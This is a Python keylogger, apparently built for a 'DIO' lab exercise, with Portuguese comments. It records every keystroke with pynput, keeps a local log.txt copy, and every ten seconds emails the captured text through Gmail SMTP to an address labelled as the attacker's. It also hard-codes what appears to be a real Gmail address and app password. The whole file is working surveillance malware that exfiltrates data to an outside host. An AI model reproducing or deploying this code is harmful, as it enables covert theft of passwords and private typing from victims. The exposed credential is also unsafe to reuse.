import os
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from pynput import keyboard

# Configurações de E-mail informadas
EMAIL_ATACANTE = "ascloaldo@gmail.com"
SENHA_APP = "kpux acdq erpt gbly"

# Diretório e ficheiro de log local
diretorio_atual = os.path.dirname(os.path.abspath(__file__))
arquivo_log = os.path.join(diretorio_atual, "log.txt")

# Buffer global para acumular as teclas e controle de concorrência
buffer_teclas = ""
lock = threading.Lock()


def enviar_email():
  global buffer_teclas

  # Agenda a próxima execução desta função para daqui a 10 segundos
  threading.Timer(10.0, enviar_email).start()

  # Captura o conteúdo atual do buffer e limpa-o com segurança
  with lock:
    conteudo = buffer_teclas
    buffer_teclas = ""

  # Se nada foi digitado, define a mensagem padrão solicitada
  if not conteudo.strip():
    conteudo = "[Nenhuma tecla foi digitada neste intervalo de 10 segundos]"

  # Montagem da mensagem de e-mail
  msg = MIMEMultipart()
  msg["From"] = EMAIL_ATACANTE
  msg["To"] = EMAIL_ATACANTE
  msg["Subject"] = "Relatório Keylogger - Simulação Laboratório DIO"

  msg.attach(MIMEText(conteudo, "plain", "utf-8"))

  try:
    # Conexão com o servidor SMTP do Gmail (TLS - Porta 587)
    servidor = smtplib.SMTP("smtp.gmail.com", 587)
    servidor.starttls()
    servidor.login(EMAIL_ATACANTE, SENHA_APP)
    servidor.sendmail(EMAIL_ATACANTE, EMAIL_ATACANTE, msg.as_string())
    servidor.quit()
    print("[+] Relatório enviado por e-mail com sucesso.")
  except Exception as e:
    print(f"[-] Erro ao enviar e-mail: {e}")


def ao_pressionar_tecla(tecla):
  global buffer_teclas
  try:
    caractere = tecla.char
  except AttributeError:
    caractere = f" [{tecla.name}] "

  # Adiciona a tecla capturada ao buffer global
  with lock:
    if caractere:
      buffer_teclas += caractere
    else:
      buffer_teclas += " "

  # Registo de backup local no log.txt
  with open(arquivo_log, "a", encoding="utf-8") as f:
    f.write(str(caractere) if caractere else " ")


def iniciar_keylogger():
  print(
      f"[*] Keylogger ativo. A enviar logs para {EMAIL_ATACANTE} a cada 10s.")
  print("[*] Pressione 'Ctrl + C' no terminal para encerrar.")

  # Inicia o ciclo de envio de e-mails em segundo plano
  enviar_email()

  # Inicia a escuta do teclado
  with keyboard.Listener(on_press=ao_pressionar_tecla) as listener:
    listener.join()


if __name__ == "__main__":
  iniciar_keylogger()